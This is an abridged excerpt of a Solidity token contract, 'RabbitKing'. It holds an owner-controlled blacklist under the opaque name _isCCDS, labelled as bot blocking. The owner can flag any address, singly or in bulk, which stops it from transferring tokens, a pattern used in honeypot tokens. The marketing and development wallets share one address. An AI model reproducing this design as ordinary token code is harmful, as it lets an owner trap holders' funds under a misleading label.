/**
 ____    ______  ____     ____    ______  ______      __  __   ______   __  __  ____      
/\  _`\ /\  _  \/\  _`\  /\  _`\ /\__  _\/\__  _\    /\ \/\ \ /\__  _\ /\ \/\ \/\  _`\    
\ \ \L\ \ \ \L\ \ \ \L\ \\ \ \L\ \/_/\ \/\/_/\ \/    \ \ \/'/'\/_/\ \/ \ \ `\\ \ \ \L\_\  
 \ \ ,  /\ \  __ \ \  _ <'\ \  _ <' \ \ \   \ \ \     \ \ , <    \ \ \  \ \ , ` \ \ \L_L  
  \ \ \\ \\ \ \/\ \ \ \L\ \\ \ \L\ \ \_\ \__ \ \ \     \ \ \\`\   \_\ \__\ \ \`\ \ \ \/, \
   \ \_\ \_\ \_\ \_\ \____/ \ \____/ /\_____\ \ \_\     \ \_\ \_\ /\_____\\ \_\ \_\ \____/
    \/_/\/ /\/_/\/_/\/___/   \/___/  \/_____/  \/_/      \/_/\/_/ \/_____/ \/_/\/_/\/___/ 
...
library Address{
 ...
 contract RabbitKing is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isCCDS;
    ...
    address public marketingWallet = 0xf6d3E9F58c26A80E07601ac9B9D7d49B76EfaF55;
    address public developmentWallet = 0xf6d3E9F58c26A80E07601ac9B9D7d49B76EfaF55;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_isCCDS[from] && !_isCCDS[to], "You are a bot");
    ...
    function updateIsCCDS(address account, bool state) external onlyOwner{
        _isCCDS[account] = state;
    }
    
    function bulkIsCCDS(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isCCDS[accounts[i]] = state;
